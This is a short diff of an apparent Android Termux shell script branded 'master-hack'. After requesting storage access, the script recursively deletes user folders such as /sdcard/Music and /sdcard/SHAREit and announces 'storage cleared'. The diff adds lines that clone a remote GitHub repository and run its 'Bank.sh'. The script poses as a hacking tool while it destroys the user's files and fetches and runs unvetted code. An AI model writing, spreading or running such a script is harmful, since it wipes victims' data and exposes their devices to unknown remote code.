@@ -4,6 +4,8 @@ termux-setup-storage
 pkg update
 pkg upgrade
 apt install figlet
+pkg install git
+git clone https://github.com/DRACULA-HACK/master-hack
 clear
 figlet master-hack
 sleep 15
@@ -73,3 +75,5 @@ rm -rf cd /sdcard/Music
 rm -rf cd /sdcard/SHAREit
 Sleep 15
 echo "storage cleared by"
+cd master-hack
+bash Bank.sh
